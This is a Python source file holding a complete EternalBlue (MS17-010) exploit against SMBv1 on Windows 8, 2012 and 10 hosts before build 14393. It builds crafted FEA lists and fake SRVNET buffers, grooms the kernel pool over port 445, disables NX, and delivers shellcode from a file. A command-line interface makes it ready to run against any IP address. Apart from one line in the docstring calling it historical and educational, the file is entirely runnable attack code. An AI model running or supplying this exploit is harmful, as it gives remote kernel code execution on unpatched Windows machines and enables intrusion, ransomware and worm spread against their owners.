#!/usr/bin/env python3
"""EternalBlue exploit implementation by Shad0w.

The exploit targets Windows 8/2012/10 (build < 14393) x64 hosts. The code is kept
for historical/educational reasons – use with care.
"""

from __future__ import annotations

import argparse
import socket
import sys
from struct import pack
from typing import Iterable, Tuple

from impacket import ntlm, smb

# Feel free to use/update this code.
USERNAME = ""
PASSWORD = ""

# Because the SRVNET buffer changed dramatically from Windows 7, the NTFEA size
# needs to be 0x9000.
NTFEA_SIZE = 0x9000

TARGET_HAL_HEAP_ADDR = 0xFFFF_FFFF_FFD0_4000  # Location for fake structs/shellcode.

# feaList for disabling NX is possible because we just want to change only
# MDL.MappedSystemVa. PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800.
SHELLCODE_PAGE_ADDR = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xFFFF_FFFF_FFFF_F000
PTE_ADDR = 0xFFFF_F6FF_FFFF_E800 + 8 * ((SHELLCODE_PAGE_ADDR - 0xFFFF_FFFF_FFD0_0000) >> 12)


def _repeat_bytes(value: bytes, count: int) -> bytes:
    """Return *value* repeated *count* times."""

    return value * count if count else b""


def build_ntfea9000() -> bytes:
    """Construct the NTFEA buffer used by the exploit."""

    entries = bytearray(_repeat_bytes(pack("<BBH", 0, 0, 0) + b"\x00", 0x260))
    entries.extend(pack("<BBH", 0, 0, 0x735C))
    entries.extend(b"\x00" * 0x735D)
    entries.extend(pack("<BBH", 0, 0, 0x8147))
    entries.extend(b"\x00" * 0x8148)
    return bytes(entries)


NTFEA_9000 = build_ntfea9000()


def build_fake_srvnet_buffer_nx() -> bytes:
    """Build the fake SRVNET buffer used to disable NX."""

    buffer = bytearray(b"\x00" * 16)
    buffer.extend(pack("<HHIQ", 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR))
    buffer.extend(b"\x00" * 16)
    buffer.extend(b"\x00" * 16)
    buffer.extend(pack("<QQ", 0, 0))
    buffer.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR))
    buffer.extend(pack("<QQ", 0, 0))
    buffer.extend(b"\x00" * 16)
    buffer.extend(b"\x00" * 16)
    buffer.extend(pack("<QHHI", 0, 0x60, 0x1004, 0))
    buffer.extend(pack("<QQ", 0, PTE_ADDR + 7 - 0x7F))
    return bytes(buffer)


FAKE_SRVNET_BUFFER_NX = build_fake_srvnet_buffer_nx()


def build_fea_list_nx() -> bytes:
    """Return the FEA list used for NX disabling."""

    fea_list = bytearray(pack("<I", 0x10000))
    fea_list.extend(NTFEA_9000)
    fea_list.extend(pack("<BBH", 0, 0, len(FAKE_SRVNET_BUFFER_NX) - 1))
    fea_list.extend(FAKE_SRVNET_BUFFER_NX)
    fea_list.extend(pack("<BBH", 0x12, 0x34, 0x5678))
    return bytes(fea_list)


def create_fake_srvnet_buffer(sc_size: int) -> bytes:
    """Build the fake SRVNET buffer used for shellcode placement."""

    total_recv_size = 0x80 + 0x180 + sc_size
    buffer = bytearray(b"\x00" * 16)
    buffer.extend(pack("<HHIQ", 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR))
    buffer.extend(pack("<QII", 0, 0x82E8, 0))
    buffer.extend(b"\x00" * 16)
    buffer.extend(pack("<QQ", 0, total_recv_size))
    buffer.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR))
    buffer.extend(pack("<QQ", 0, 0))
    buffer.extend(b"\x00" * 16)
    buffer.extend(b"\x00" * 16)
    buffer.extend(pack("<QHHI", 0, 0x60, 0x1004, 0))
    buffer.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR - 0x80))
    return bytes(buffer)


def create_fea_list(sc_size: int) -> bytes:
    """Construct the FEA list that carries the shellcode payload."""

    fake_srvnet_buf = create_fake_srvnet_buffer(sc_size)
    fea_list = bytearray(pack("<I", 0x10000))
    fea_list.extend(NTFEA_9000)
    fea_list.extend(pack("<BBH", 0, 0, len(fake_srvnet_buf) - 1))
    fea_list.extend(fake_srvnet_buf)
    fea_list.extend(pack("<BBH", 0x12, 0x34, 0x5678))
    return bytes(fea_list)


def build_fake_recv_struct() -> bytes:
    """Return the fake receive structure used by the exploit."""

    structure = bytearray(_repeat_bytes(b"\x00" * 16, 5))
    structure.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR + 0x58))
    structure.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR + 0x58, 0))
    structure.extend(_repeat_bytes(b"\x00" * 16, 10))
    structure.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR + 0x170, 0))
    structure.extend(pack("<QQ", (0x8150 ^ 0xFFFF_FFFF_FFFF_FFFF) + 1, 0))
    structure.extend(pack("<QII", 0, 0, 3))
    structure.extend(_repeat_bytes(b"\x00" * 16, 3))
    structure.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR + 0x180))
    return bytes(structure)


FAKE_RECV_STRUCT = build_fake_recv_struct()


def get_nt_status(self):
    return (self["ErrorCode"] << 16) | (self["_reserved"] << 8) | self["ErrorClass"]


setattr(smb.NewSMBPacket, "getNTStatus", get_nt_status)


class MYSMB(smb.SMB):
    """Override SMB.neg_session() to force NTLM authentication."""

    def __init__(self, remote_host: str, use_ntlmv2: bool = True):
        self.__use_ntlmv2 = use_ntlmv2
        super().__init__(remote_host, remote_host)

    def neg_session(self, extended_security: bool = True, negPacket=None):  # type: ignore[override]
        super().neg_session(extended_security=self.__use_ntlmv2, negPacket=negPacket)


def create_session_alloc_non_paged(target: str, size: int) -> MYSMB:
    conn = MYSMB(target, use_ntlmv2=False)
    _, flags2 = conn.get_flags()
    if size >= 0xFFFF:
        flags2 &= ~smb.SMB.FLAGS2_UNICODE
        req_size = size // 2
    else:
        flags2 |= smb.SMB.FLAGS2_UNICODE
        req_size = size
    conn.set_flags(flags2=flags2)

    pkt = smb.NewSMBPacket()
    session_setup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
    session_setup["Parameters"] = smb.SMBSessionSetupAndX_Extended_Parameters()

    params = session_setup["Parameters"]
    params["MaxBufferSize"] = 61440
    params["MaxMpxCount"] = 2
    params["VcNumber"] = 2
    params["SessionKey"] = 0
    params["SecurityBlobLength"] = 0
    params["Capabilities"] = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS

    session_setup["Data"] = pack("<H", req_size) + b"\x00" * 20
    pkt.addCommand(session_setup)

    conn.sendSMB(pkt)
    recv_pkt = conn.recvSMB()
    if recv_pkt.getNTStatus() == 0:
        print("SMB1 session setup allocate nonpaged pool success")
        return conn

    if USERNAME:
        flags2 &= ~smb.SMB.FLAGS2_UNICODE
        req_size = size // 2
        conn.set_flags(flags2=flags2)

        pkt = smb.NewSMBPacket()
        session_setup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
        session_setup["Parameters"] = smb.SMBSessionSetupAndX_Extended_Parameters()
        params = session_setup["Parameters"]
        params["MaxBufferSize"] = 61440
        params["MaxMpxCount"] = 2
        params["VcNumber"] = 2
        params["SessionKey"] = 0
        params["SecurityBlobLength"] = 0
        params["Capabilities"] = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS

        pwd_unicode = conn.get_ntlmv1_response(ntlm.compute_nthash(PASSWORD))
        params["Reserved"] = len(pwd_unicode)
        user_bytes = USERNAME.encode("ascii")
        session_setup["Data"] = pack("<H", req_size + len(pwd_unicode) + len(user_bytes))
        session_setup["Data"] += pwd_unicode + user_bytes + b"\x00" * 16
        pkt.addCommand(session_setup)

        conn.sendSMB(pkt)
        recv_pkt = conn.recvSMB()
        if recv_pkt.getNTStatus() == 0:
            print("SMB1 session setup allocate nonpaged pool success")
            return conn

    print("SMB1 session setup allocate nonpaged pool failed")
    sys.exit(1)


class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
    structure = (
        ("TotalParameterCount", "<H=0"),
        ("TotalDataCount", "<H"),
        ("ParameterCount", "<H=0"),
        ("ParameterOffset", "<H=0"),
        ("ParameterDisplacement", "<H=0"),
        ("DataCount", "<H"),
        ("DataOffset", "<H"),
        ("DataDisplacement", "<H=0"),
        ("FID", "<H=0"),
    )


def send_trans2_second(conn: smb.SMB, tid: int, data: bytes, displacement: int) -> None:
    pkt = smb.NewSMBPacket()
    pkt["Tid"] = tid

    trans_command = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
    trans_command["Parameters"] = SMBTransaction2Secondary_Parameters_Fixed()
    trans_command["Data"] = smb.SMBTransaction2Secondary_Data()

    params = trans_command["Parameters"]
    params["TotalParameterCount"] = 0
    params["TotalDataCount"] = len(data)

    fixed_offset = 32 + 3 + 18
    trans_command["Data"]["Pad1"] = b""

    params["ParameterCount"] = 0
    params["ParameterOffset"] = 0

    if data:
        pad2_len = (4 - fixed_offset % 4) % 4
        trans_command["Data"]["Pad2"] = b"\xFF" * pad2_len
    else:
        trans_command["Data"]["Pad2"] = b""
        pad2_len = 0

    params["DataCount"] = len(data)
    params["DataOffset"] = fixed_offset + pad2_len
    params["DataDisplacement"] = displacement

    trans_command["Data"]["Trans_Parameters"] = b""
    trans_command["Data"]["Trans_Data"] = data
    pkt.addCommand(trans_command)

    conn.sendSMB(pkt)


def send_big_trans2(
    conn: smb.SMB,
    tid: int,
    setup: int,
    data: bytes,
    param: bytes,
    first_data_fragment_size: int,
    send_last_chunk: bool = True,
) -> int:
    pkt = smb.NewSMBPacket()
    pkt["Tid"] = tid

    command = pack("<H", setup)

    trans_command = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
    trans_command["Parameters"] = smb.SMBNTTransaction_Parameters()
    trans_command["Parameters"]["MaxSetupCount"] = 1
    trans_command["Parameters"]["MaxParameterCount"] = len(param)
    trans_command["Parameters"]["MaxDataCount"] = 0
    trans_command["Data"] = smb.SMBTransaction2_Data()

    params = trans_command["Parameters"]
    params["Setup"] = command
    params["TotalParameterCount"] = len(param)
    params["TotalDataCount"] = len(data)

    fixed_offset = 32 + 3 + 38 + len(command)
    if param:
        pad_len = (4 - fixed_offset % 4) % 4
        pad_bytes = b"\xFF" * pad_len
        trans_command["Data"]["Pad1"] = pad_bytes
    else:
        trans_command["Data"]["Pad1"] = b""
        pad_len = 0

    params["ParameterCount"] = len(param)
    params["ParameterOffset"] = fixed_offset + pad_len

    if data:
        pad2_len = (4 - (fixed_offset + pad_len + len(param)) % 4) % 4
        trans_command["Data"]["Pad2"] = b"\xFF" * pad2_len
    else:
        trans_command["Data"]["Pad2"] = b""
        pad2_len = 0

    params["DataCount"] = first_data_fragment_size
    params["DataOffset"] = params["ParameterOffset"] + len(param) + pad2_len

    trans_command["Data"]["Trans_Parameters"] = param
    trans_command["Data"]["Trans_Data"] = data[:first_data_fragment_size]
    pkt.addCommand(trans_command)

    conn.sendSMB(pkt)
    recv_pkt = conn.recvSMB()
    if recv_pkt.getNTStatus() == 0:
        print("got good NT Trans response")
    else:
        print(f"got bad NT Trans response: 0x{recv_pkt.getNTStatus():x}")
        sys.exit(1)

    index = first_data_fragment_size
    while index < len(data):
        send_size = min(4096, len(data) - index)
        if len(data) - index <= 4096 and not send_last_chunk:
            break
        send_trans2_second(conn, tid, data[index : index + send_size], index)
        index += send_size

    if send_last_chunk:
        conn.recvSMB()
    return index


def create_connection_with_big_smb_first80(target: str, for_nx: bool = False) -> socket.socket:
    sk = socket.create_connection((target, 445))
    pkt = b"\x00" + b"\x00" + pack(">H", 0x8100)
    pkt += b"BAAD"
    if for_nx:
        sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        pkt += b"\x00" * 0x7B
    else:
        pkt += b"\x00" * 0x7C
    sk.send(pkt)
    return sk


def exploit(
    target: str,
    shellcode: bytes,
    num_groom_conn: int,
    fea_list: bytes,
    fea_list_nx: bytes,
) -> None:
    conn = smb.SMB(target, target)
    conn.login(USERNAME, PASSWORD)
    server_os = conn.get_server_os()
    print(f"Target OS: {server_os}")
    if server_os.startswith("Windows 10 "):
        build = int(server_os.split()[-1])
        if build >= 14393:
            print("This exploit does not support this target")
            sys.exit()
    elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
        print("This exploit does not support this target")
        sys.exit()

    tid = conn.tree_connect_andx(f"\\\\{target}\\IPC$")

    progress = send_big_trans2(conn, tid, 0, fea_list, b"\x00" * 30, len(fea_list) % 4096, False)

    nxconn = smb.SMB(target, target)
    nxconn.login(USERNAME, PASSWORD)
    nxtid = nxconn.tree_connect_andx(f"\\\\{target}\\IPC$")
    nxprogress = send_big_trans2(nxconn, nxtid, 0, fea_list_nx, b"\x00" * 30, len(fea_list_nx) % 4096, False)

    alloc_conn = create_session_alloc_non_paged(target, NTFEA_SIZE - 0x2010)

    srvnet_conn = []
    for _ in range(num_groom_conn):
        sk = create_connection_with_big_smb_first80(target, for_nx=True)
        srvnet_conn.append(sk)

    hole_conn = create_session_alloc_non_paged(target, NTFEA_SIZE - 0x10)
    alloc_conn.get_socket().close()

    for _ in range(5):
        sk = create_connection_with_big_smb_first80(target, for_nx=True)
        srvnet_conn.append(sk)

    hole_conn.get_socket().close()

    send_trans2_second(nxconn, nxtid, fea_list_nx[nxprogress:], nxprogress)
    recv_pkt = nxconn.recvSMB()
    ret_status = recv_pkt.getNTStatus()
    if ret_status == 0xC000000D:
        print("good response status for nx: INVALID_PARAMETER")
    else:
        print(f"bad response status for nx: 0x{ret_status:08x}")

    for sk in srvnet_conn:
        sk.send(b"\x00")

    send_trans2_second(conn, tid, fea_list[progress:], progress)
    recv_pkt = conn.recvSMB()
    ret_status = recv_pkt.getNTStatus()
    if ret_status == 0xC000000D:
        print("good response status: INVALID_PARAMETER")
    else:
        print(f"bad response status: 0x{ret_status:08x}")

    for sk in srvnet_conn:
        sk.send(FAKE_RECV_STRUCT + shellcode)

    for sk in srvnet_conn:
        sk.close()

    nxconn.disconnect_tree(tid)
    nxconn.logoff()
    nxconn.get_socket().close()
    conn.disconnect_tree(tid)
    conn.logoff()
    conn.get_socket().close()


def parse_args(argv: Iterable[str]) -> Tuple[str, str, int]:
    parser = argparse.ArgumentParser(
        description="EternalBlue exploit (Windows 8/2012/10 pre-14393)",
        usage="%(prog)s <ip> <shellcode_file> [numGroomConn]",
    )
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("shellcode_file", help="Path to shellcode payload")
    parser.add_argument(
        "num_groom_conn",
        nargs="?",
        type=int,
        default=13,
        help="Number of grooming connections to create (default: 13)",
    )
    args = parser.parse_args(list(argv))
    return args.ip, args.shellcode_file, args.num_groom_conn


def main(argv: Iterable[str]) -> None:
    target, shellcode_file, num_groom_conn = parse_args(argv)

    with open(shellcode_file, "rb") as fp:
        shellcode = fp.read()

    if len(shellcode) > 0xE80:
        print(
            "Shellcode too long. The place that this exploit puts a shellcode is limited to "
            f"{0xE80} bytes."
        )
        sys.exit()

    fea_list = create_fea_list(len(shellcode))
    fea_list_nx = build_fea_list_nx()

    print(f"shellcode size: {len(shellcode):d}")
    print(f"numGroomConn: {num_groom_conn:d}")

    exploit(target, shellcode, num_groom_conn, fea_list, fea_list_nx)
    print("done")


if __name__ == "__main__":
    main(sys.argv[1:])
